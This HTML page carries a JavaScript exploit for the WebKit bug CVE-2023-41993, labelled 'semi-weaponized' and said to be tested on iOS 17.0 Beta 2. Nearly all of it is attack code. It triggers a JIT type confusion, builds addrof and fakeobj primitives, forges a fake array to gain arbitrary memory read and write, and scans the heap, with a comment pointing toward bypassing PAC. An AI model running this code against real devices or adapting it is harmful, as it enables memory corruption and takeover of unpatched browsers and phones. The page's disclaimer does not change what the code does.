
<!DOCTYPE html>
<html>
<body>
<h1>Exploit for CVE-2023-41993</h1>
<script src="./util.js"></script>
<script src="./int64.js"></script>
<script src="./helper.js"></script>
<script>
/*
semi-weaponized exploit for CVE-2023-41993
tested on iOS 17.0 Beta 2 on iPhone 14 Pro Max
Author: https://github.com/0x06060606
*** DO NOT USE THIS EXPLOIT FOR MALICIOUS PURPOSES ***
poc: https://github.com/po6ix/POC-for-CVE-2023-41993/tree/main
poc author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

function hax(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;
    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;
    function get_getterSetter(type) {
        let o, retval;
        if (type == 0) o = object_a;
        else o = object_b;
        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

function setup_addrof_fakeobj() {
    var getter, getterSetter;
    for (let i = 1; i <= ITERATIONS; i++) {
        [getter, getterSetter] = hax();
        try {
            getterSetter.toString();
        } catch(e) {
            break;
        }
    }
    if (getterSetter == undefined) {
        log("Failed to trigger getterSetter!");
        alert("Failed to trigger getterSetter!");
        location.reload();
        return [null, null];
    } else {
        let symbolObject = Object(getterSetter);
        let ref_arr = [];
        for (let i = 0; i < offsets.factor; ++i) {
            ref_arr.push(symbolObject.description);
        }
        getter.p13 = 1.1;
        let unboxed_arr = getter;
        let addrof = function addrof(o) {
            boxed_arr[OVERLAP_OFFSET] = o;
            var addr = unboxed_arr[0];
            boxed_arr[OVERLAP_OFFSET] = null;
            return addr;
        }
        let fakeobj = function fakeobj(addr) {
            unboxed_arr[0] = addr;
            var fake = boxed_arr[OVERLAP_OFFSET];
            boxed_arr[OVERLAP_OFFSET] = null;
            return fake;
        }
        return [addrof, fakeobj];
    }
}

function setup_rw(){
    SetupOffsets();
    log("Stage 1: setup addrof and fakeobj");
    let [raw_addrof, raw_fakeobj] = setup_addrof_fakeobj();
    function addrof(obj) {
        return Int64.fromDouble(raw_addrof(obj));
    }
    function fakeobj(addr) {
        return raw_fakeobj(addr.asDouble());
    }
    log("Stage 2: setup r/w primitive");
    let float_arr = [Math.random(), 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let jscell_header = new Int64([
        0x00, 0x10, 0x00, 0x00,     // m_structureID
        0x7,                        // m_indexingType (ArrayWithDouble)
        0x23,                       // m_type
        0x08,                       // m_flags
        0x1                         // m_cellState
    ]).asDouble();
    let container = {
        jscell_header: jscell_header,
        butterfly: float_arr,
    };
    let container_addr = addrof(container);
    let fake_array_addr = Add(container_addr, 16);
    log("[*] Fake JSArray @ " + fake_array_addr);
    let fake_arr = fakeobj(fake_array_addr);
    let legit_arr = float_arr;
    let results = [];
    for (let i = 0; i < 2; i++) {
        let a = i == 0 ? fake_arr : legit_arr;
        results.push(a[0]);
    }
    jscell_header = results[0];
    container.jscell_header = jscell_header;
    log(`[*] Copied legit JSCell header: ${Int64.fromDouble(jscell_header)}`);
    let controller = fake_arr;
    let memarr = float_arr;
    function read64(addr) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        controller[1] = oldval;
        return Int64.fromDouble(res);
    }
    function read8(addr) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 1);
            i += 1;
        } while (res === undefined);
        controller[1] = oldval;
        return Int64.fromDouble(res);
    }
    function write64(addr, val) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        memarr[i-1] = val.asDouble();
        controller[1] = oldval;
    }
    function write8(addr, val) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 1);
            i += 1;
        } while (res === undefined);
        memarr[i-1] = val.asDouble();
        controller[1] = oldval;
    }
    let testarray = [1.1, 2.2, 3.3, 4.4, 5.5];
    let testarray_addr = addrof(testarray);
    log("[*] testarray @ " + testarray_addr);
    let testarray_before = read64(testarray_addr);
    log("[*] testarray = " + testarray_before.toString());
    write64(testarray_addr, new Int64(0xdeadc0de));
    let testarray_after = read64(testarray_addr);
    log("[*] testarray = " + testarray_after.toString());
    if (testarray_after.toString() == new Int64(0xdeadc0de)) {
        write64(testarray_addr, testarray_before);
        log("[*] testarray = " + read64(testarray_addr).toString());
        log("[+] Achieved limited arbitrary read/write \\o/");
        function HeapScanner(ATS, STP) {
            log("[*] Scanning @ " + ATS.toString());
            var dumped = {};
            var dumpOffset = 0;
            var dumpMap = [];
            for (let i = 0; i < ITERATIONS; i++) {
                var trgtAddr = read64(Add(ATS, dumpOffset));
                if (trgtAddr.toString() == new Int64(0x0000000000000000)) {
                    log("[*] Reached end of heap, stopping scan");
                    break;
                } else {
                    var fakey = fakeobj(trgtAddr);
                    dumped[trgtAddr] = fakey;
                    dumpMap.push(trgtAddr);
                    dumpOffset += STP; // sizeof(void*)
                }
            }
            log("[*] Dumped " + Object.keys(dumped).length + " objects");
            for (let i = 0; i < Object.keys(dumped).length; i++) {
                try {
                    var ObjAddr = Object.keys(dumped)[i];
                    var ObjType = Object.prototype.toString.call(dumped[ObjAddr]);
                    log(" ["+i+"] " + ObjAddr.toString());
                    log("  ["+i+"] " + (typeof dumped[ObjAddr]) + " " + ObjType.toString());
                } catch(e) {
                    log(" [!] " + e);
                }
            }
            return [dumped, dumpMap];
        }
        // Use HeapScanner for bypassing PAC hardening on iOS 17.0 Beta 2
    } else {
        log("[-] Failed to achieve limited arbitrary read/write :(");
        alert("[-] Failed to achieve limited arbitrary read/write :(");
        location.reload();
        return;
    }
}

setup_rw();

</script>
</body>
</html>